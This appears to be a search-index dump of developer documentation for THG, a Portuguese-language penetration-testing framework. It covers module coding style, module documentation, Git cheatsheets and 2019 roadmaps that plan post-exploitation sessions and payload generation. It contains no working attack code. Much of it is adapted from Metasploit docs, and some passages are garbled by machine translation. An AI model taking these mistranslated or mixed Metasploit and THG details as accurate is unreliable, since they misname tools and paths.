methods) * Two lines between different types of code (like imports and the metadata, see above) * Four spaces for indenting Some coding choices to think about when writing your module: * Prefer \"foo {}\".format('bar') over interpolation with % * Keep your callback methods short and readable. If it gets cluttered, break out sub-tasks into well-named functions * Variable names should be descriptive, readable, and short ( a guide ) * If you really need Python3 features in your module, use #!/usr/bin/env python3 for the shebang * If you have a lot of legacy code in 2.7 or need a 2.7 library, use #!/usr/bin/env python2.7 (macOS in particular does not ship with a python2 executable by default) * If possible, have your module compatible with both and use #!/usr/bin/env python","title":"Coding with Style"},{"location":"dev/dark/Writing-External-Python-Modules/#potentially-common-questions","text":"","title":"(Potentially) Common Questions"},{"location":"dev/dark/Writing-External-Python-Modules/#why-doesnt-the-module-appear-when-i-search-for-it-in-msfconsole","text":"The module may have errors and fail to load inside of msfconsole. Check the framework log file, ~/.msf4/logs/framework.log , for error messages. Also, if the module is not marked as executable, then it will not show up when you search for it in msfconsole.","title":"Why doesn't the module appear when I search for it in msfconsole?"},{"location":"dev/dark/Writing-External-Python-Modules/#why-is-the-output-from-the-python-module-not-showing-up-in-msfconsole","text":"The external modules communicate with framework via JSON-RPC. If your Python module contains print statements, framework may not recognize those as JSON-RPC requests. Use the LogHandler or module.log() to send status information, which will be displayed in msfconsole.","title":"Why is the output from the Python module not showing up in msfconsole?"},{"location":"dev/dark/Writing-External-Python-Modules/#additional-resources","text":"Rapid7 Blog: Regifting Python in Metasploit Rapid7 Blog: External Metasploit Modules: The Gift That Keeps On Slithering Metasploit Python library ERB Templates","title":"Additional Resources"},{"location":"dev/dark/Writing-Module-Documentation/","text":"Adding and reviewing module documentation is a great way to contribute to the Metasploit Framework. Before you write any module documentation, you should take a look at the sample template, module_doc_template.md, which is located in metasploit-framework/documentation/modules/markdown_doc, or take a look at any of the KBs that are already available. Writing a KB To write a KB, you'll need to: Create a markdown (.md) file. Write the content. Save the file and name it after the module name. For example, the filename for ms08-067 is modules/exploits/windows/smb/ms08_067_netapi.rb , so its documentation is documentation/modules/exploits/windows/smb/ms08_067_netapi.md . Place it in the metasploit-framework/documentation/modules directory. Where to put the markdown files If you go to metasploit-framework/documentation/modules, you'll see that there are documentation directories for each module type: auxiliary, exploit, payload, and post. To figure out where you need to put the file, you'll need to look at the module's path. Start msfconsole. Type use <module name> . Type info -d . When the module name appears, look at the Module field. You'll see a file path for the module. That's the path where the KB needs to be added. For example: msf> use auxiliary/scanner/smb/smb_login msf (smb_login)> info Name: SMB Login Check Scanner Module: auxiliary/scanner/smb/smb_login .... If you were creating a KB for the smb login scanner, you'd add it to metasploit-framework/documentation/modules/auxiliary/smb.md . Sections you should include in the KB These are just suggestions, but it'd be nice if the KB had these sections: Vulnerable Applications - Tells users what targets are vulnerable to the module and provides instructions on how to access vulnerable targets for testing. Verification Steps - Tells users how to use the module and what the expected results are from running the module. Options - Provides descriptions of all the options that can be run with the module. Additionally, clearly identify the options that are required. Scenarios - Provides sample usage and describes caveats that the user may need to be aware of when running the module.","title":"Writing Module Documentation"},{"location":"dev/dark/Writing-Module-Documentation/#writing-a-kb","text":"To write a KB, you'll need to: Create a markdown (.md) file. Write the content. Save the file and name it after the module name. For example, the filename for ms08-067 is modules/exploits/windows/smb/ms08_067_netapi.rb , so its documentation is documentation/modules/exploits/windows/smb/ms08_067_netapi.md . Place it in the metasploit-framework/documentation/modules directory.","title":"Writing a KB"},{"location":"dev/dark/Writing-Module-Documentation/#where-to-put-the-markdown-files","text":"If you go to metasploit-framework/documentation/modules, you'll see that there are documentation directories for each module type: auxiliary, exploit, payload, and post. To figure out where you need to put the file, you'll need to look at the module's path. Start msfconsole. Type use <module name> . Type info -d . When the module name appears, look at the Module field. You'll see a file path for the module. That's the path where the KB needs to be added. For example: msf> use auxiliary/scanner/smb/smb_login msf (smb_login)> info Name: SMB Login Check Scanner Module: auxiliary/scanner/smb/smb_login .... If you were creating a KB for the smb login scanner, you'd add it to metasploit-framework/documentation/modules/auxiliary/smb.md .","title":"Where to put the markdown files"},{"location":"dev/dark/Writing-Module-Documentation/#sections-you-should-include-in-the-kb","text":"These are just suggestions, but it'd be nice if the KB had these sections: Vulnerable Applications - Tells users what targets are vulnerable to the module and provides instructions on how to access vulnerable targets for testing. Verification Steps - Tells users how to use the module and what the expected results are from running the module. Options - Provides descriptions of all the options that can be run with the module. Additionally, clearly identify the options that are required. Scenarios - Provides sample usage and describes caveats that the user may need to be aware of when running the module.","title":"Sections you should include in the KB"},{"location":"dev/git/Git-Reference-Sites/","text":"Learning Git Os sites a seguir s\u00e3o \u00f3timas refer\u00eancias para Git Padawans e Jedi: Git-SVN crash course : Lots of good stuff on helping newbies grok the concepts of Git w/ reference to similar concepts in Subversion. learn.github.com : GitHub's own reference site. Includes helpful GitHub-specific information. Git Reference : From the site: \"meant to be a quick reference for learning and remembering the most important and commonly used Git commands.\" Follows a tutorial-like format. Great for beginners. The Pro Git Book : A free, online copy of the Pro Git book by GitHubber Scott Chacon. The Git Community Book : A free book put together by the Git community for those new to Git. Git Magic : Another free Git book put together by a Stanford CS student. Git Ready : A collection of Git tips and tricks. Why Git is Better Than X : In case you still need convincing, this site breaks down Git vs. other popular SCM packages. The Git Parable : A story by GitHub founder Tom Preston-Werner that reveals the underlying principles behind Git's construction. A great starting point for understanding the nature of Git. Git is Easier Than You Think : A nice tutorial that breaks down one Git user's experience switching from Subversion. PeepCode: Git : A one-hour (not-free) screencast covering Git basics. Well-made and easy to follow. Git - The Simple Guide : A simple introductory guide to getting up and running with Git. GitHub Flow : Another great post from Scott Chacon describing a GitHub-based workflow for projects. Getting Started with GitHub : Also from GitHub's own Scott Chacon, this two-part screencast (one free and one paid) will walk you through the basics of using GitHub. Using Git in Editors Fugitive plugin for Vim : Provides lots of tasty functionality from inside Vim. There's also a five-part series on VimCasts on using Fugitive for almost any git task you can think of. TextMate - a bundle for git ships with the editor. Highlight your top-level folder in the project drawer and then invoke with Command-Shift-G SVN mirroring Of course, if you're still having trouble, GitHub does offer basic SVN read-write support .","title":"Git-Reference-Sites"},{"location":"dev/git/Git-Reference-Sites/#learning-git","text":"Os sites a seguir s\u00e3o \u00f3timas refer\u00eancias para Git Padawans e Jedi: Git-SVN crash course : Lots of good stuff on helping newbies grok the concepts of Git w/ reference to similar concepts in Subversion. learn.github.com : GitHub's own reference site. Includes helpful GitHub-specific information. Git Reference : From the site: \"meant to be a quick reference for learning and remembering the most important and commonly used Git commands.\" Follows a tutorial-like format. Great for beginners. The Pro Git Book : A free, online copy of the Pro Git book by GitHubber Scott Chacon. The Git Community Book : A free book put together by the Git community for those new to Git. Git Magic : Another free Git book put together by a Stanford CS student. Git Ready : A collection of Git tips and tricks. Why Git is Better Than X : In case you still need convincing, this site breaks down Git vs. other popular SCM packages. The Git Parable : A story by GitHub founder Tom Preston-Werner that reveals the underlying principles behind Git's construction. A great starting point for understanding the nature of Git. Git is Easier Than You Think : A nice tutorial that breaks down one Git user's experience switching from Subversion. PeepCode: Git : A one-hour (not-free) screencast covering Git basics. Well-made and easy to follow. Git - The Simple Guide : A simple introductory guide to getting up and running with Git. GitHub Flow : Another great post from Scott Chacon describing a GitHub-based workflow for projects. Getting Started with GitHub : Also from GitHub's own Scott Chacon, this two-part screencast (one free and one paid) will walk you through the basics of using GitHub.","title":"Learning Git"},{"location":"dev/git/Git-Reference-Sites/#using-git-in-editors","text":"Fugitive plugin for Vim : Provides lots of tasty functionality from inside Vim. There's also a five-part series on VimCasts on using Fugitive for almost any git task you can think of. TextMate - a bundle for git ships with the editor. Highlight your top-level folder in the project drawer and then invoke with Command-Shift-G","title":"Using Git in Editors"},{"location":"dev/git/Git-Reference-Sites/#svn-mirroring","text":"Of course, if you're still having trouble, GitHub does offer basic SVN read-write support .","title":"SVN mirroring"},{"location":"dev/git/Git-cheatsheet/","text":"Git Cheatsheet (n\u00edvel de sobreviv\u00eancia) Aqui est\u00e1 um conjunto de algumas das coisas mais comuns que voc\u00ea precisa fazer no seu fluxo de trabalho di\u00e1rio com o Git. Dica 1: voc\u00ea pode obter p\u00e1ginas de manual para qualquer comando git, inserindo um h\u00edfen. Como em: \"man git-fetch\" ou \"man git-merge\" Dica profissional 2: instale o pysheeet para ter uma lista de boas paraticas de codigo python O que est\u00e1 acontecendo ? Em que branch estou? Quais foram os arquivos modificados ? Quais s\u00e3o testados, quais n\u00e3o s\u00e3o rastreados etc.? Quais foram os arquivos adicionados e modificados oque esta acontecendo ? Em que branch estou? Quais arquivos s\u00e3o modificados, quais s\u00e3o testados, quais n\u00e3o s\u00e3o rastreados etc.? commando -> git status Fetch, Pull, and Push Receba todas as novas altera\u00e7\u00f5es e refs de refs remota comando-> git fetch Fa\u00e7a uma busca no repositorio git e (se poss\u00edvel) uma mesclagem na ramifica\u00e7\u00e3o atual( baixar atualizacoes ) comando-> git pull Enviar alteracoes para o repositorio usando o push e submetendo a origin/master/(branch especifica) (como o SVN): comando-> git push origin master alteracoes para uma branch especifica: git push origin your_branch_name Branching mostra corrente branches git branch mudar para uma branch especifica git checkout existing_branch_name Crie uma nova branch e mude para ela: git checkout -b new_branch_name Merging and Stashing juntar minha branch de trabalho para a branch atual: git merge working_branch_name Limpe temporariamente meu desk para que eu possa mudar para outro ramo git stash Recupere minhas coisas gardadas, deixando-as na lista de esconderijos: git stash apply Recupere minhas coisas escondidas, removendo-as da lista: git stash pop History, Conflicts, and Fixing Mistakes ver log dos commits: git log Veja quais altera\u00e7\u00f5es foram feitas em um determinado commit: git show COMMIT_HASH Veja informa\u00e7\u00f5es de log mais detalhadas: git whatchanged Livre-se de todas as altera\u00e7\u00f5es que fiz desde a \u00faltima confirma\u00e7\u00e3o: git reset --hard Livre-se das altera\u00e7\u00f5es de apenas um arquivo: git checkout FILENAME *Fa\u00e7a HEAD apontar para o estado da base de c\u00f3digo a partir de 2 commits atr\u00e1s: git checkout HEAD^^ Corrija um conflito (com a ferramenta gr\u00e1fica padr\u00e3o do sistema): git mergetool Reverte um commit (tenha cuidado com mesclagens!): git revert <commit hash> Reverter um commit de um merge: git revert -m<number of commits back in the merge to revert> <hash of merge commit> (e.g. git revert -m1 4f76f3bbb83ffe4de74a849ad9f68707e3568e16 will revert the first commit back in the merge performed at 4f76f3bbb83ffe4de74a849ad9f68707e3568e16) Git in Bash function parse_git_branch { git branch --no-color 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/(\\1)/' }","title":"Git_cheatsheet"},{"location":"dev/git/Git-cheatsheet/#git-cheatsheet-nivel-de-sobrevivencia","text":"Aqui est\u00e1 um conjunto de algumas das coisas mais comuns que voc\u00ea precisa fazer no seu fluxo de trabalho di\u00e1rio com o Git. Dica 1: voc\u00ea pode obter p\u00e1ginas de manual para qualquer comando git, inserindo um h\u00edfen. Como em: \"man git-fetch\" ou \"man git-merge\" Dica profissional 2: instale o pysheeet para ter uma lista de boas paraticas de codigo python","title":"Git Cheatsheet (n\u00edvel de sobreviv\u00eancia)"},{"location":"dev/git/Git-cheatsheet/#o-que-esta-acontecendo","text":"Em que branch estou? Quais foram os arquivos modificados ? Quais s\u00e3o testados, quais n\u00e3o s\u00e3o rastreados etc.? Quais foram os arquivos adicionados e modificados","title":"O que est\u00e1 acontecendo ?"},{"location":"dev/git/Git-cheatsheet/#oque-esta-acontecendo","text":"Em que branch estou? Quais arquivos s\u00e3o modificados, quais s\u00e3o testados, quais n\u00e3o s\u00e3o rastreados etc.? commando -> git status","title":"oque esta acontecendo ?"},{"location":"dev/git/Git-cheatsheet/#fetch-pull-and-push","text":"Receba todas as novas altera\u00e7\u00f5es e refs de refs remota comando-> git fetch Fa\u00e7a uma busca no repositorio git e (se poss\u00edvel) uma mesclagem na ramifica\u00e7\u00e3o atual( baixar atualizacoes ) comando-> git pull Enviar alteracoes para o repositorio usando o push e submetendo a origin/master/(branch especifica) (como o SVN): comando-> git push origin master alteracoes para uma branch especifica: git push origin your_branch_name","title":"Fetch, Pull, and Push"},{"location":"dev/git/Git-cheatsheet/#branching","text":"mostra corrente branches git branch mudar para uma branch especifica git checkout existing_branch_name Crie uma nova branch e mude para ela: git checkout -b new_branch_name","title":"Branching"},{"location":"dev/git/Git-cheatsheet/#merging-and-stashing","text":"juntar minha branch de trabalho para a branch atual: git merge working_branch_name Limpe temporariamente meu desk para que eu possa mudar para outro ramo git stash Recupere minhas coisas gardadas, deixando-as na lista de esconderijos: git stash apply Recupere minhas coisas escondidas, removendo-as da lista: git stash pop","title":"Merging and Stashing"},{"location":"dev/git/Git-cheatsheet/#history-conflicts-and-fixing-mistakes","text":"ver log dos commits: git log Veja quais altera\u00e7\u00f5es foram feitas em um determinado commit: git show COMMIT_HASH Veja informa\u00e7\u00f5es de log mais detalhadas: git whatchanged Livre-se de todas as altera\u00e7\u00f5es que fiz desde a \u00faltima confirma\u00e7\u00e3o: git reset --hard Livre-se das altera\u00e7\u00f5es de apenas um arquivo: git checkout FILENAME *Fa\u00e7a HEAD apontar para o estado da base de c\u00f3digo a partir de 2 commits atr\u00e1s: git checkout HEAD^^ Corrija um conflito (com a ferramenta gr\u00e1fica padr\u00e3o do sistema): git mergetool Reverte um commit (tenha cuidado com mesclagens!): git revert <commit hash> Reverter um commit de um merge: git revert -m<number of commits back in the merge to revert> <hash of merge commit> (e.g. git revert -m1 4f76f3bbb83ffe4de74a849ad9f68707e3568e16 will revert the first commit back in the merge performed at 4f76f3bbb83ffe4de74a849ad9f68707e3568e16)","title":"History, Conflicts, and Fixing Mistakes"},{"location":"dev/git/Git-cheatsheet/#git-in-bash","text":"function parse_git_branch { git branch --no-color 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/(\\1)/' }","title":"Git in Bash"},{"location":"dev/git/Using-Git/","text":"Use esta cole\u00e7\u00e3o de recursos para trabalhar com o reposit\u00f3rio git do thg Framework. Cheatsheet | Git cheatsheet Sites de refer\u00eancia | Sites de refer\u00eancia do Git Configurando um ambiente de desenvolvimento - isso orientar\u00e1 voc\u00ea na cria\u00e7\u00e3o de uma solicita\u00e7\u00e3o pull [Landing Pull Requests] - este \u00e9 o procedimento pelo qual os principais desenvolvedores do Metasploit passam para mesclar sua solicita\u00e7\u00e3o [Remo\u00e7\u00e3o de ramifica\u00e7\u00e3o remota] Uma bifurca\u00e7\u00e3o \u00e9 quando voc\u00ea captura instantaneamente a base de c\u00f3digo de outra pessoa no seu pr\u00f3prio reposit\u00f3rio, presumivelmente no gitlab.com, e essa base de c\u00f3digo pode ter suas pr\u00f3prias ramifica\u00e7\u00f5es, mas voc\u00ea geralmente captura instantaneamente a ramifica\u00e7\u00e3o principal. Voc\u00ea geralmente clona seu fork na sua m\u00e1quina local. Voc\u00ea cria seus pr\u00f3prios ramos, que s\u00e3o ramifica\u00e7\u00f5es de seu pr\u00f3prio fork. Esses snapshots, mesmo que enviados ao seu github, n\u00e3o fazem parte da base de c\u00f3digo original, neste caso, o darkcode357/thg-framework. Se voc\u00ea enviar uma solicita\u00e7\u00e3o de recebimento, sua ramifica\u00e7\u00e3o (geralmente) poder\u00e1 ser transferida para a ramifica\u00e7\u00e3o principal da base de c\u00f3digo original (geralmente ... voc\u00ea poder\u00e1 ser transferido para uma ramifica\u00e7\u00e3o experimental ou algo assim, se o seu c\u00f3digo for uma altera\u00e7\u00e3o maci\u00e7a ou algo assim, mas isso n\u00e3o \u00e9 t\u00edpica). Voc\u00ea apenas bifurca uma vez, clona quantas vezes voce quiser e nas codificar e ramifica, confirma e empurra quantas vezes quiser (nem sempre precisa empurrar, pode empurrar mais tarde ou n\u00e3o , mas voc\u00ea precisar\u00e1 enviar antes de fazer uma solicita\u00e7\u00e3o de recebimento, tamb\u00e9m conhecida como PR), e enviar\u00e1 um PR quando estiver pronto. Ver abaixo gitlab.com/darkcode357/thg-framework/ --> fork --> github.com/<...>/thg-framework ^ | | git clone git://gitlab.com/<...>/thg-framework.git | | `-- accepted <-- pull request V ^ /home/<...>/repo/thg-framework | | | | github.com/<...>/thg-framework/branch_xyz | | | | | V V | V branch_abc ... `-- push <-- branch_xyz","title":"Using-Git"},{"location":"dev/roadmaps/2019/2019-Roadmap-Review/","text":"Revis\u00e3o do roteiro de 2019 do THG Em 2019, publicamos nosso primeiro roteiro aberto para o desenvolvimento do THE HACKER GROUP. Como fizemos? Para realiza\u00e7\u00f5es, metas para 2019: O back-end do modelo de dados do THG: a quipe darkcode0x00 trabalhou muito na elaboracao do design nisso constru\u00edmos alguns projetos iniciais de Prova de Conceito, onde voc\u00ea podera contribuir direto com a ramifica\u00e7\u00e3o principal. Voc\u00ea pode ver um v\u00eddeo dele aqui: adicionar . Nesse meio tempo, come\u00e7amos a juntar as partes do ramo principal de desenvolvimento O primeiro passo para aceitar contribui\u00e7\u00f5es foi a realizada com o projeto xcode-mod-0x00 . M\u00f3dulos independentes que s\u00e3o executados isoladamente( class THG_MOD ou plugin ), al\u00e9m de uma m\u00e3o cheia de novos m\u00f3dulos, demonstrando as vantagens do design desenvolvido pela thgcmd , incluindo suporte em tempode de execucao. O suporte nativo para iOS e macOS esta em desenvolvimento. Coisas que ainda n\u00e3o terminamos: O projeto xcode-socket-0x00 vem com o intuito de da suporte h\u00e1 sess\u00f5es cybersX #meta 2019 A interface RESTful do THG n\u00e3o foi conclu\u00edda em 2019, portanto, continuaremos em 2020. O tratamento da sess\u00e3o como um processo separado ainda nao foi implementado junto com o projeto xcode-cybersX-MNG , porem mais trabalho precisa ser feito para iniciar a compatibilidade com o sistema. O suporte \u00e0 sess\u00e3o ass\u00edncrona permanece na prancheta. O suporte ao SOCKS5/SOCKS4/HTTPS/HTTP n\u00e3o foi liberado, mas o THG ganhou muito mais suporte para a execu\u00e7\u00e3o de m\u00f3dulos externamente como PLUGINS , CLASS PLUGINS , e ganhou suporte inicial para a execu\u00e7\u00e3o de m\u00f3dulos no Python em tempo de execucao, permitindo um interpretador dinamico. A gera\u00e7\u00e3o de carga \u00fatil modernizada com novas ferramentas continua sendo pesquisada.","title":"Roadmap_Review"},{"location":"dev/roadmaps/2019/2019-Roadmap-Review/#revisao-do-roteiro-de-2019-do-thg","text":"Em 2019, publicamos nosso primeiro roteiro aberto para o desenvolvimento do THE HACKER GROUP. Como fizemos? Para realiza\u00e7\u00f5es, metas para 2019: O back-end do modelo de dados do THG: a quipe darkcode0x00 trabalhou muito na elaboracao do design nisso constru\u00edmos alguns projetos iniciais de Prova de Conceito, onde voc\u00ea podera contribuir direto com a ramifica\u00e7\u00e3o principal. Voc\u00ea pode ver um v\u00eddeo dele aqui: adicionar . Nesse meio tempo, come\u00e7amos a juntar as partes do ramo principal de desenvolvimento O primeiro passo para aceitar contribui\u00e7\u00f5es foi a realizada com o projeto xcode-mod-0x00 . M\u00f3dulos independentes que s\u00e3o executados isoladamente( class THG_MOD ou plugin ), al\u00e9m de uma m\u00e3o cheia de novos m\u00f3dulos, demonstrando as vantagens do design desenvolvido pela thgcmd , incluindo suporte em tempode de execucao. O suporte nativo para iOS e macOS esta em desenvolvimento.","title":"Revis\u00e3o do roteiro de 2019 do THG"},{"location":"dev/roadmaps/2019/2019-Roadmap-Review/#coisas-que-ainda-nao-terminamos","text":"O projeto xcode-socket-0x00 vem com o intuito de da suporte h\u00e1 sess\u00f5es cybersX #meta 2019 A interface RESTful do THG n\u00e3o foi conclu\u00edda em 2019, portanto, continuaremos em 2020. O tratamento da sess\u00e3o como um processo separado ainda nao foi implementado junto com o projeto xcode-cybersX-MNG , porem mais trabalho precisa ser feito para iniciar a compatibilidade com o sistema. O suporte \u00e0 sess\u00e3o ass\u00edncrona permanece na prancheta. O suporte ao SOCKS5/SOCKS4/HTTPS/HTTP n\u00e3o foi liberado, mas o THG ganhou muito mais suporte para a execu\u00e7\u00e3o de m\u00f3dulos externamente como PLUGINS , CLASS PLUGINS , e ganhou suporte inicial para a execu\u00e7\u00e3o de m\u00f3dulos no Python em tempo de execucao, permitindo um interpretador dinamico. A gera\u00e7\u00e3o de carga \u00fatil modernizada com novas ferramentas continua sendo pesquisada.","title":"Coisas que ainda n\u00e3o terminamos:"},{"location":"dev/roadmaps/2019/2019-Roadmap/","text":"THG Roadmap 2019 A partir de 2019, forneceremos um roteiro aberto para definir nossas metas para o ano. As metas s\u00e3o baseadas em muitas discuss\u00f5es que tivemos no nucleo de desenvolvimento thg-xcode-dev com usu\u00e1rios, desenvolvedores e clientes. A inten\u00e7\u00e3o \u00e9 fornecer foco para os principais desenvolvedores e colaboradores, para que possamos trabalhar juntos em dire\u00e7\u00e3o a uma vis\u00e3o comum de como queremos que o thg evolua. Este ano, os temas do THG s\u00e3o modularidade, ,desenvolvimento do nucleo,estabilidade,modelos de class O THG cresceu organicamente ao longo dos anos em um projeto muito grande, combinando os m\u00f3dulos, cargas \u00fateis, junto a grande banco de dados, intera\u00e7\u00e3o do usu\u00e1rio e muito mais em um \u00fanico aplicativo monol\u00edtico. Embora o design tenha nos servido bem, ele atingiu alguns limites de manuten\u00e7\u00e3o e agilidade. Enquanto continuamos a refatorar, aprimorar e reorganizar o THG diariamente, aprimoramentos em larga escala se tornam cada vez mais dif\u00edceis e destacam a fragilidade no sistema geral, devido ao seu design altamente interdependente. Queremos permitir que os usu\u00e1rios contribuam sem esfor\u00e7o para as partes do THG em que est\u00e3o interessados \u200b\u200be possam reutilizar o c\u00f3digo, tanto dentro como fora do projeto. As restri\u00e7\u00f5es de idioma e licenciamento apresentaram barreiras para os usu\u00e1rios, reais e imagin\u00e1rios. Python, Go, C # e outras linguagens est\u00e3o influenciando predominantemente a comunidade infosec. Gostar\u00edamos de poder acolher mais desenvolvedores, pesquisadores e ferramentas no ecossistema do THG, aproveitando o melhor da categoria e evitando a s\u00edndrome n\u00e3o inventada aqui sempre que poss\u00edvel. Em resumo, queremos desenvolver servi\u00e7os reutiliz\u00e1veis, modulares e confi\u00e1veis \u200b\u200bpara permitir que pesquisadores, testadores , estudantes e equipes vermelhas trabalhem eficientemente, tenham acesso \u00e0s mais recentes tecnologias e t\u00e9cnicas e continuem a crescer a comunidade THG. O roteiro O back-end do modelo de dados do TGH deve ser separado em seu pr\u00f3prio projeto. Os planos incluem um servi\u00e7o de dados que fornece uma interface RESTful, uma visualiza\u00e7\u00e3o orientada a eventos e suporte a co-rotinas, desempenho aprimorado e f\u00e1cil interoperabilidade direta com outras ferramentas. O tratamento de sess\u00f5es deve poder operar independentemente da estrutura, permitindo que os usu\u00e1rios compartilhem sess\u00f5es e permitindo que os servidores tenham o melhor desempenho, a confiabilidade e o menor peso poss\u00edvel. J\u00e1 come\u00e7amos um projeto chamado 'xcode-socket-0x00', que \u00e9 a primeira gera\u00e7\u00e3o desse design. Uma vez conclu\u00eddo, a integra\u00e7\u00e3o direta com outras estruturas tamb\u00e9m deve ser poss\u00edvel. O THG deve suportar sess\u00f5es ass\u00edncronas. Atualmente, muitos testadores usam estruturas ass\u00edncronas, como o Empire, para manter uma persist\u00eancia leve ou pontos de apoio em uma rede, e depois precisam interagir com a CybersX nas sess\u00f5es interativas. Gostar\u00edamos de poder suportar perfeitamente os dois modos de opera\u00e7\u00e3o, incluindo a capacidade de executar m\u00f3dulos p\u00f3s-explora\u00e7\u00e3o e m\u00f3dulos sobre piv\u00f4s de maneira ass\u00edncrona. O THG deve suportar a execu\u00e7\u00e3o de explora\u00e7\u00e3o e m\u00f3dulos auxiliares em um modo isolado. Est\u00e3o em andamento planos para oferecer suporte a uma API de m\u00f3dulo RPC/RESTFULL para a estrutura do THG, fornecendo servi\u00e7os principais como carga \u00fatil e manipula\u00e7\u00e3o de sess\u00f5es, roteamento de rede, relat\u00f3rios e registros. Os m\u00f3dulos s\u00e3o executados como processos filhos no THG e s\u00e3o carregados apenas na mem\u00f3ria, conforme necess\u00e1rio. A rede do ponto de vista do m\u00f3dulo ser\u00e1 gerenciada por meio do suporte a proxy SOCKS5, conectando o ambiente filho ou chamadas remotas \u00e0 API, removendo amplamente a necessidade de objetos de SOCKETS especialmente criados ou altera\u00e7\u00f5es nas bibliotecas de protocolos de terceiros. Os m\u00f3dulos, quando escritos para a API THG, podem at\u00e9 ser testados e usados \u200b\u200bindependentemente da estrutura completa do THG . Al\u00e9m dessas metas principais, tamb\u00e9m gostar\u00edamos de explorar: Gostar\u00edamos de implementar pelo menos o suporte do servidor para SMB 2.0, tanto para compartilhar arquivos quanto para comunica\u00e7\u00f5es de pipe nomeado. A otimiza\u00e7\u00e3o do medidor do medidor do Windows * em breve substituir\u00e1 o medidor do POSIX original, o que reduzir\u00e1 o tamanho do medidor do Windows. Mudar do OpenSSL para o suporte nativo ao SChannel simplificar\u00e1 e reduzir\u00e1 o indicador do medidor do Windows, permitindo focar no que ele suporta melhor. Pesquisa de roteador e IoT * Gostar\u00edamos de continuar a pesquisa e suporte para explora\u00e7\u00e3o de dispositivos incorporados e suporte de primeira classe para ambientes com recursos limitados. Modernizando a gera\u00e7\u00e3o de carga \u00fatil * Estamos investigando a possibilidade de integra\u00e7\u00e3o com cadeias de ferramentas de terceiros para a montagem e compilacao de C, .NET, Java, dinamicamente, facilitando ao usu\u00e1rio a aquisi\u00e7\u00e3o e o uso das ferramentas, fornecendo o primeiro Suporte a v\u00e1rias arquiteturas e plataformas.","title":"Roadmap"},{"location":"dev/roadmaps/2019/2019-Roadmap/#thg-roadmap-2019","text":"A partir de 2019, forneceremos um roteiro aberto para definir nossas metas para o ano. As metas s\u00e3o baseadas em muitas discuss\u00f5es que tivemos no nucleo de desenvolvimento thg-xcode-dev com usu\u00e1rios, desenvolvedores e clientes. A inten\u00e7\u00e3o \u00e9 fornecer foco para os principais desenvolvedores e colaboradores, para que possamos trabalhar juntos em dire\u00e7\u00e3o a uma vis\u00e3o comum de como queremos que o thg evolua. Este ano, os temas do THG s\u00e3o modularidade, ,desenvolvimento do nucleo,estabilidade,modelos de class O THG cresceu organicamente ao longo dos anos em um projeto muito grande, combinando os m\u00f3dulos, cargas \u00fateis, junto a grande banco de dados, intera\u00e7\u00e3o do usu\u00e1rio e muito mais em um \u00fanico aplicativo monol\u00edtico. Embora o design tenha nos servido bem, ele atingiu alguns limites de manuten\u00e7\u00e3o e agilidade. Enquanto continuamos a refatorar, aprimorar e reorganizar o THG diariamente, aprimoramentos em larga escala se tornam cada vez mais dif\u00edceis e destacam a fragilidade no sistema geral, devido ao seu design altamente interdependente. Queremos permitir que os usu\u00e1rios contribuam sem esfor\u00e7o para as partes do THG em que est\u00e3o interessados \u200b\u200be possam reutilizar o c\u00f3digo, tanto dentro como fora do projeto. As restri\u00e7\u00f5es de idioma e licenciamento apresentaram barreiras para os usu\u00e1rios, reais e imagin\u00e1rios. Python, Go, C # e outras linguagens est\u00e3o influenciando predominantemente a comunidade infosec. Gostar\u00edamos de poder acolher mais desenvolvedores, pesquisadores e ferramentas no ecossistema do THG, aproveitando o melhor da categoria e evitando a s\u00edndrome n\u00e3o inventada aqui sempre que poss\u00edvel. Em resumo, queremos desenvolver servi\u00e7os reutiliz\u00e1veis, modulares e confi\u00e1veis \u200b\u200bpara permitir que pesquisadores, testadores , estudantes e equipes vermelhas trabalhem eficientemente, tenham acesso \u00e0s mais recentes tecnologias e t\u00e9cnicas e continuem a crescer a comunidade THG.","title":"THG Roadmap 2019"},{"location":"dev/roadmaps/2019/2019-Roadmap/#o-roteiro","text":"O back-end do modelo de dados do TGH deve ser separado em seu pr\u00f3prio projeto. Os planos incluem um servi\u00e7o de dados que fornece uma interface RESTful, uma visualiza\u00e7\u00e3o orientada a eventos e suporte a co-rotinas, desempenho aprimorado e f\u00e1cil interoperabilidade direta com outras ferramentas. O tratamento de sess\u00f5es deve poder operar independentemente da estrutura, permitindo que os usu\u00e1rios compartilhem sess\u00f5es e permitindo que os servidores tenham o melhor desempenho, a confiabilidade e o menor peso poss\u00edvel. J\u00e1 come\u00e7amos um projeto chamado 'xcode-socket-0x00', que \u00e9 a primeira gera\u00e7\u00e3o desse design. Uma vez conclu\u00eddo, a integra\u00e7\u00e3o direta com outras estruturas tamb\u00e9m deve ser poss\u00edvel. O THG deve suportar sess\u00f5es ass\u00edncronas. Atualmente, muitos testadores usam estruturas ass\u00edncronas, como o Empire, para manter uma persist\u00eancia leve ou pontos de apoio em uma rede, e depois precisam interagir com a CybersX nas sess\u00f5es interativas. Gostar\u00edamos de poder suportar perfeitamente os dois modos de opera\u00e7\u00e3o, incluindo a capacidade de executar m\u00f3dulos p\u00f3s-explora\u00e7\u00e3o e m\u00f3dulos sobre piv\u00f4s de maneira ass\u00edncrona. O THG deve suportar a execu\u00e7\u00e3o de explora\u00e7\u00e3o e m\u00f3dulos auxiliares em um modo isolado. Est\u00e3o em andamento planos para oferecer suporte a uma API de m\u00f3dulo RPC/RESTFULL para a estrutura do THG, fornecendo servi\u00e7os principais como carga \u00fatil e manipula\u00e7\u00e3o de sess\u00f5es, roteamento de rede, relat\u00f3rios e registros. Os m\u00f3dulos s\u00e3o executados como processos filhos no THG e s\u00e3o carregados apenas na mem\u00f3ria, conforme necess\u00e1rio. A rede do ponto de vista do m\u00f3dulo ser\u00e1 gerenciada por meio do suporte a proxy SOCKS5, conectando o ambiente filho ou chamadas remotas \u00e0 API, removendo amplamente a necessidade de objetos de SOCKETS especialmente criados ou altera\u00e7\u00f5es nas bibliotecas de protocolos de terceiros. Os m\u00f3dulos, quando escritos para a API THG, podem at\u00e9 ser testados e usados \u200b\u200bindependentemente da estrutura completa do THG . Al\u00e9m dessas metas principais, tamb\u00e9m gostar\u00edamos de explorar: Gostar\u00edamos de implementar pelo menos o suporte do servidor para SMB 2.0, tanto para compartilhar arquivos quanto para comunica\u00e7\u00f5es de pipe nomeado. A otimiza\u00e7\u00e3o do medidor do medidor do Windows * em breve substituir\u00e1 o medidor do POSIX original, o que reduzir\u00e1 o tamanho do medidor do Windows. 